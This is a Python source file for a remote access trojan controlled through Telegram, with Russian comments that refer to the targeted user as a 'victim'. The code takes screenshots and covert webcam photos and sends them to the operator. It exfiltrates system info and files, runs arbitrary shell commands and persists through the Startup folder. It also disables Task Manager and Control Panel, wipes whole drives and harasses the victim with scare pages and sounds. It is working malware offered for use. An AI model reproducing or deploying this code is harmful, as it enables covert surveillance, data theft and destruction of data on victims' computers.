import os
import getpass
import sys
import time
from tkinter import messagebox #messagebox.showinfo("Error", "Errror detected")
import platform
import requests
import telebot
import datetime
from gtts import gTTS
import playsound
from PIL import ImageGrab
import webbrowser
import cv2
import shutil
import ctypes
###########################################################################
UserName = '\\' + getpass.getuser()
chat_id = 
token = ''
bot = telebot.TeleBot(token)
#############################################################################
#rat = os.path.dirname(os.path.realpath(__file__))
#tree = os.getcwd()
#shutil.copytree(tree, 'C:\\Users' + UserName + '\\Documents\\exe.win32-3.7')
#os.startfile('C:\\Users' + UserName + '\\Documents\\exe.win32-3.7\\mailer.exe')

#SCREENSHOT##################################################################
def screen():
    snapshot = ImageGrab.grab()
    save_path = "C:\\Users" + UserName + "\\Pictures\\MySnapshot.jpg"
    snapshot.save(save_path)
    screen = open("C:\\Users" + UserName + "\\Pictures\\MySnapshot.jpg", 'rb')
    bot.send_photo(chat_id, screen)
#CLIENT-INFO################################################################
def client():
    date = datetime.datetime.now()
    r = requests.get('http://ip.42.pl/raw')
    ip = r.text 
    windows = platform.platform() 
    processor = platform.processor()
    bot.send_message(chat_id, "Время у жертвы:" + str(date) + "\nЮзер: " + UserName + "\nIP: " + ip + "\nOS: " + windows + "\nПроцессор: " + processor) # Отправляем сообщение с данными
###########################################################################
def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % UserName
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)
###########################################################################


@bot.message_handler(commands=['start', 'Start']) # Ждём команды Start / start
def send_message(command): # Если команду выполнили
    date = datetime.datetime.now()
    r = requests.get('http://ip.42.pl/raw')
    ip = r.text 
    windows = platform.platform() 
    processor = platform.processor()
    bot.send_message(chat_id,"Жертва на связи! \nВремя подключения:\n" + str(date) + "\nЮзер: " + UserName + 
    "\nIP: " + ip + "\nOС: " + windows)
    bot.send_message(chat_id, "\n\nЧтобы узнать команды, введи: \n /commands")
  
@bot.message_handler(commands=['help', 'commands', 'Help', 'Commands']) # КОМАНДЫ
def send_msg(command):
    bot.send_message(chat_id, "Основные команды:"+
    "\n/Screen - Скриншот экрана \n/Webcam - загрузить фото с веб-камеры"+
    "\n/Info - Инфо о юзере \n/cd - выбор директории \n/ls - Просмотр файлов текущей директории"+
    "\n/Download - скачать файл директории \n/Run - запустить файл \n/Del - удалить файл \n/Del_dir - удалить папку"+
    "\n/WiFi - Отключить WiFi \n/Link - Открыть ссылку \n(пример: /Link www.google.com)" +
    "\n/Autorun - добавить файл в автозагрузку \n/Error - вывести жертве сообщение Error" +
    "\n/cmd - выполнить код командной строки \n/Disabletskmgr - убить диспетчер задач"+
    "\n/Antivirus - проверить наличие Антивирусного ПО \n/Explorer - открыть файловый менеджер")
    
    bot.send_message(chat_id, "\nКоманды для развлечения:"+
    "\n/Achtung - вывести жертве сообщение АХТУНГ! ТОБИ ПИЗДА \n /custombox - отправить жертве кастомизированное сообщение"+
    "\n/Screamer - открыть в браузере скример-фото \n/SwapMouse - поменять местами клавиши мыши"+
    "\n/WannaCry - жертве откроется этот сайт: https://geekprank.com/fake-virus/" +
    "\n/FBI - фейковое предупреждение от ФБР https://geekprank.com/fbi-warning/"+
    "\n/Moans - женские стоны \n/Moanss - женские стоны но громче \n/Pig - визг свиньи")

    bot.send_message(chat_id, "\nВирусы:"+
    "\n/killcursor - Удалить курсор \n/blackscreen - Черный экран и неуправляемый Windows"+
    "\n/Stoppanel - запрещаем заходить в панель управления \n/Killpanel - отключить панель управления"+
    "\n/Delall - удалить все файлы на всех дисках \n/Mute - отключить все звуки в системе"+
    "\n/Stoprun - убрать возможность запуска программ \n/Killexplorer - убить файловый менеджер")
    
    bot.send_message(chat_id, "\nКоманды отключения:"+
    "\n\n/Reboot - перезагрузка устройства жертвы \n/Off - выключить устройство жертвы" +
    "\n\n/Exit - выключить вирус удаленного доступа"+
    "\n/Uninstall - Удалить вирус с устройства жертвы")
    


@bot.message_handler(commands=['screen', 'Screen'])
def send_screen(command):
    screen()

@bot.message_handler(commands=['Info', 'info']) # Ждём команды
def send_info(command):
    client()

@bot.message_handler(commands=['WiFi', 'wifi']) # Ждём команды
def offwifi(command):
    bot.send_message(chat_id, "Жертва отключена от сети интернет. Связь потеряна!")
    cmd = "netsh wlan disconnect"
    os.system(cmd)

@bot.message_handler(commands=["Link", "link"]) # ОТКРЫТЬ ССЫЛКУ
def open_url(message):	
    user_msg = "{0}".format(message.text)
    url = user_msg.split(" ")[1]
    webbrowser.open_new_tab(url)
    bot.send_message(chat_id, "Устройство жертвы открыло ссылку, указанную Вами")

@bot.message_handler(commands=['Autorun', 'autorun'])
def autorun(command):
    add_to_startup(file_path="")

@bot.message_handler(commands=['Error', 'error'])
def error(command):
    ctypes.windll.user32.MessageBoxW(0, "Error!", "Unexpected error!", 1)
    bot.send_message(chat_id, "Реакция жертвы:")
    webcam(command)

@bot.message_handler(commands=['Achtung', 'achtung'])
def pizda(command):
    ctypes.windll.user32.MessageBoxW(0, "ТОБИ ПИЗДА", "АХТУНГ", 1)

@bot.message_handler(commands=['custombox'])
def custombox(message):
    user_msg = "{0}".format(message.text)
    msg = user_msg.split("/custombox ")[1]
    ctypes.windll.user32.MessageBoxW(0, msg, "INFORMATION", 1)



@bot.message_handler(commands=['Off', 'off'])
def shutdown(command):
    bot.send_message(chat_id, "Устройство жертвы выключилось! Связь потеряна!")
    cmd = "shutdown /p"
    os.system(cmd)

@bot.message_handler(commands=['Exit', 'exit'])
def exit(command):
    bot.send_message(chat_id, "Отключаюсь")
    bot.send_message(chat_id, "Спасибо за использование! До связи")
    os.abort()

@bot.message_handler(commands=['Antivirus', 'antivirus'])
def antivirus(command):
    bot.send_message(chat_id,'Поиск антивирусного ПО...')
    if os.path.exists('C:\\Program Files\\Windows Defender'):
        bot.send_message(chat_id,'Windows Defender')
    if os.path.exists('C:\\Program Files\\AVAST Software\\Avast'):
        bot.send_message(chat_id,'Avast')
    if os.path.exists('C:\\Program Files\\AVG\\Antivirus'):
        bot.send_message(chat_id,'AVG')
    if os.path.exists('C:\\Program Files (x86)\\Avira\\Launcher'):
        bot.send_message(chat_id,'Avira')
    if os.path.exists('C:\\Program Files (x86)\\IObit\\Advanced SystemCare'):
        bot.send_message(chat_id,'Advanced SystemCare')
    if os.path.exists('C:\\Program Files\\Bitdefender Antivirus Free'):
        bot.send_message(chat_id,'Bitdefender')
    if os.path.exists('C:\\Program Files\\DrWeb'):
        bot.send_message(chat_id,'Dr.Web')
    if os.path.exists('C:\\Program Files\\ESET\\ESET Security'):
        bot.send_message(chat_id,'ESET')
    if os.path.exists('C:\\Program Files (x86)\\Kaspersky Lab'):
        bot.send_message(chat_id,'Kaspersky')
    if os.path.exists('C:\\Program Files (x86)\\360\\Total Security'):
        bot.send_message(chat_id,'360 Total Security')
    bot.send_message(chat_id, "Это все антивирусы, найденные на устройстве жертвы")
    
@bot.message_handler(commands=['Webcam', 'webcam'])
def webcam(command):
    try:
        bot.send_chat_action(command.chat.id, 'upload_photo')
        cap = cv2.VideoCapture(0)
        for i in range(30):
            cap.read()
        ret, frame = cap.read()
        cv2.imwrite('C:\\ProgramData\\Webcam.jpg', frame)   
        cap.release()
        webcam = open('C:\\ProgramData\\Webcam.jpg', 'rb')
        bot.send_message(chat_id, "Фото с вебкамеры жертвы:")
        bot.send_photo(command.chat.id, webcam)
        webcam.close()
        os.remove('C:\\ProgramData\\Webcam.jpg')
    except:
 	    bot.send_message(chat_id, "У жертвы нету камеры!")

@bot.message_handler(commands=['Reboot', 'reboot'])
def reboot(command):
    bot.send_message(chat_id, "Перезагрузка устройства жертвы")
    os.system('shutdown -r /t 0 /f')


@bot.message_handler(commands=["cmd", "Cmd"])
def cmd_command(message):
    user_msg = "{0}".format(message.text)
    cmdcommand = user_msg.split(" ")[1]
    os.system(cmdcommand)
    bot.send_message(chat_id, "Готово!")

@bot.message_handler(commands=["Uninstall", "uninstall"])
def uninstall(message):
    directory = 'C:\\ProgramData\\'
    with open(os.path.join(directory, 'uninstaller.bat'), 'w') as OPATH:
        OPATH.writelines(['taskkill /f /im "' + os.path.basename(sys.argv[0]) + '"\n',
        'timeout 1\n',
        'del /s /q "', sys.argv[0]])
    os.startfile('C:\\ProgramData\\uninstaller.bat')
    bot.send_message(chat_id, "Вирус был удален с устройства. Спасибо за использование!")

@bot.message_handler(commands=["Disabletskmgr", "disabletskmgr"])
def disabletskmgr(message):
    bot.send_message(chat_id, "Пробую убить диспетчер задач")
    try:
      directory = 'C:\\ProgramData\\'
      with open(os.path.join(directory, 'regedit.bat'), 'w') as OPATH:
          OPATH.writelines(['reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f\n', 
                            'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f\n',
                            'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f'])
      os.startfile('C:\\ProgramData\\regedit.bat', 'runas')
      bot.send_message(chat_id, "Диспетчер задач пал!")
    except OSError:
        bot.send_message(chat_id, "Отказано в доступе")
    except:
        bot.send_message(chat_id, "Ошибка(")

@bot.message_handler(commands=["Explorer", "explorer"])
def startpaint(message):
    os.startfile('explorer.exe')

@bot.message_handler(commands=['Screamer', 'screamer'])
def scrmr1(command):
    webbrowser.open("https://klike.net/uploads/posts/2019-11/1573464953_26.jpg")
    time.sleep(1)
    bot.send_message(chat_id, "Реакция жертвы:")
    webcam(command)

@bot.message_handler(commands=['WannaCry'])
def wannacry(command):
    webbrowser.open("https://geekprank.com/fake-virus/")
    time.sleep(1)
    bot.send_message(chat_id, "Реакция жертвы:")
    webcam(command)

@bot.message_handler(commands=['Pig', 'pig'])
def pig(command):
    webbrowser.open("http://boobooka.com/wp-content/uploads/2018/07/zvuk-vizga-svini.mp3?_=15")
    time.sleep(1)
    bot.send_message(chat_id, "Реакция жертвы:")
    webcam(command)

@bot.message_handler(commands=['FBI'])
def fbiwarning(command):
    webbrowser.open("https://geekprank.com/fbi-warning/")
    bot.send_message(chat_id, "Реакция жертвы:")
    webcam(command)

@bot.message_handler(commands=['Moans', 'moans'])
def moans(command):
    webbrowser.open("http://boobooka.com/wp-content/uploads/2017/03/zhenskie-stony.mp3?_=9")
    bot.send_message(chat_id, "Реакция жертвы:")
    webcam(command)

@bot.message_handler(commands=['Moanss', 'moanss'])
def moanss(command):
    webbrowser.open("http://boobooka.com/wp-content/uploads/2017/03/stony-udovolstvija-zhenschiny.mp3?_=15")
    bot.send_message(chat_id, "Реакция жертвы:")
    webcam(command)


@bot.message_handler(commands=['CD', 'cd'])
def cd(message):
    try:
        bot.send_chat_action(message.chat.id, 'typing')
        user_msg = "{0}".format(message.text)
        os.chdir(user_msg.split("/CD ")[1])
        bot.send_message(message.chat.id, '*Директория изменена*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")
    except FileNotFoundError:
        bot.send_message(message.chat.id, '*Директория не найдена*', parse_mode="Markdown")
    except:
        bot.send_message(message.chat.id, '*Текущая директория*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")

@bot.message_handler(commands=['Ls', 'ls'])
def pwd(command):
    try:
        bot.send_chat_action(command.chat.id, 'typing')
        dirs = '\n``'.join(os.listdir(path="."))
        bot.send_message(command.chat.id, '`' + os.getcwd() + '`\n \n' + '`' + dirs + '`', parse_mode="Markdown")
    except:
        try:
            bot.send_chat_action(command.chat.id, 'typing')
            dirse = '\n'.join(os.listdir(path="."))
            splitted_text = util.split_string(dirse, 4096)
            for dirse in splitted_text:
                bot.send_message(command.chat.id, '`' + dirse + '`', parse_mode="Markdown")
        except:
            pass


@bot.message_handler(commands=['Download', 'download'])
def download(message):
    try:
        user_msg = "{0}".format(message.text)
        download = open(os.getcwd() + '\\' + user_msg.split("/Download ")[1], 'rb')
        bot.send_message(message.chat.id, '*Отправляем...*', parse_mode="Markdown")
        bot.send_chat_action(message.chat.id, 'upload_document')
        bot.send_document(message.chat.id, download)
    except FileNotFoundError:
        bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")

@bot.message_handler(commands=['Run'])
def run(message):
    try:
        bot.send_chat_action(message.chat.id, 'typing')
        user_msg = "{0}".format(message.text)
        os.startfile(os.getcwd() + '\\' + user_msg.split("/Run ")[1])
        bot.send_message(message.chat.id, 'Файл *' + user_msg.split("/Run ")[1] + '* открыт!')
    except FileNotFoundError:
 	    bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")

@bot.message_handler(commands=['Del'])
def delete(message):
    try:
        bot.send_chat_action(message.chat.id, 'typing')
        user_msg = "{0}".format(message.text)
        os.startfile(os.getcwd() + '\\' + user_msg.split("/Del ")[1])
        bot.send_message(message.chat.id, 'Файл *' + user_msg.split("/Del ")[1] + '* был успешно удален!')
    except FileNotFoundError:
 	    bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")


@bot.message_handler(commands = ["Del_dir", "del_dir"]) 
def delete_dir(message):
        user_msg = "{0}".format(message.text)
        path2del = user_msg.split(" ")[1]
        os.removedirs(path2del)
        bot.send_message(chat_id, "Директория " + path2del + " удалена")


@bot.message_handler(commands=['SwapMouse'])
def swapmouse(message):
    directory = 'C:\\ProgramData\\'
    with open(os.path.join(directory, 'mouseswap.bat'), 'w') as OPATH:
        OPATH.writelines(['@Echo off',
        '\nrundll32 user,SwapMouseButton'
        ])
    os.startfile('C:\\ProgramData\\mouseswap.bat')
    bot.send_message(chat_id, "Клавиши мыши жертвы были изменены местами")

@bot.message_handler(commands=['killcursor'])
def killcursor(message):
    directory = 'C:\\ProgramData\\'
    with open(os.path.join(directory, 'killcursor.bat'), 'w') as OPATH:
        OPATH.writelines(['@Echo off',
        '\ndel "%SystemRoot%Cursors*.*" >nul '
        ])
    os.startfile('C:\\ProgramData\\killcursor.bat')
    bot.send_message(chat_id, "Курсор жертвы был удален")

@bot.message_handler(commands=['blackscreen', 'Blackscreen'])
def blackscreen(message):
    directory = 'C:\\ProgramData\\'
    with open(os.path.join(directory, 'blackscreen.bat'), 'w') as OPATH:
        OPATH.writelines(['@Echo off',
        '\nrundll32 user,disableoemlayer '
        ])
    os.startfile('C:\\ProgramData\\blackscreen.bat')
    bot.send_message(chat_id, "У жертвы черный экран, Windows неуправляем")

@bot.message_handler(commands=['Stoppanel', 'stoppanel'])
def stoppanel(message):
    directory = 'C:\\ProgramData\\'
    with open(os.path.join(directory, 'stoppanel.bat'), 'w') as OPATH:
        OPATH.writelines(['@Echo off',
        '\nreg add HKCU\Software\Microsoft\Windows\Current Version\Policies\Explorer',
        '\n/v NoControlPanel /t REG_DWORD /d 1 /f >nul '
        ])
    os.startfile('C:\\ProgramData\\stoppanel.bat')
    bot.send_message(chat_id, "Жертве запрещен вход в панель управления")


@bot.message_handler(commands=['killpanel', 'Killpanel'])
def killpanel(message):
    directory = 'C:\\ProgramData\\'
    with open(os.path.join(directory, 'killpanel.bat'), 'w') as OPATH:
        OPATH.writelines(['@Echo off',
                        '\nreg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f '])
    os.startfile('C:\\ProgramData\\killpanel.bat')
    bot.send_message(chat_id, "У жертвы отключена панель управления")

@bot.message_handler(commands=['Delall', 'delall'])
def delall(message):
    directory = 'C:\\ProgramData\\'
    with open(os.path.join(directory, 'delall.bat'), 'w') as OPATH:
        OPATH.writelines(['@Echo off',
        '\ndel D:\*.* /f /s /q\ndel E:\*.* /f /s /q\ndel F:\*.* /f /s /q\ndel G:\*.* /f /s /q'
        '\ndel H:\*.* /f /s /q\ndel I:\*.* /f /s /q\ndel J:\*.* /f /s /q '])
    os.startfile('C:\\ProgramData\\dellall.bat')
    bot.send_message(chat_id, "У жертвы отключена панель управления")

@bot.message_handler(commands=['Mute', "mute"])
def mute(message):
    directory = 'C:\\ProgramData\\'
    with open(os.path.join(directory, 'mute.bat'), 'w') as OPATH:
        OPATH.writelines(['@Echo off',
        '\ndel "%SystemRoot%\Media" /q >nul '
        ])
    os.startfile('C:\\ProgramData\\mute.bat')
    bot.send_message(chat_id, "У жертвы отключены все звуки")


@bot.message_handler(commands=['Stoprun', 'stoprun'])
def stoprun(message):
    directory = 'C:\\ProgramData\\'
    with open(os.path.join(directory, 'stoprun.bat'), 'w') as OPATH:
        OPATH.writelines(['@Echo off',
        '\nreg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun /v 1 /t REG_DWORD /d %SystemRoot%\explorer.exe /f >nul '
        ])
    os.startfile('C:\\ProgramData\\stoprun.bat')
    bot.send_message(chat_id, "У жертвы отключючена возможность запуска программ")

@bot.message_handler(commands=['Killexplorer', 'killexplorer'])
def killexplorer(message):
    directory = 'C:\\ProgramData\\'
    with open(os.path.join(directory, 'killexplorer.bat'), 'w') as OPATH:
        OPATH.writelines(['@Echo off',
        '\n taskkill /f /im explorer.exe >nul '
        ])
    os.startfile('C:\\ProgramData\\killexplorer.bat')
    bot.send_message(chat_id, "У жертвы был убит файловый менеджер (Explorer)")






bot.polling()





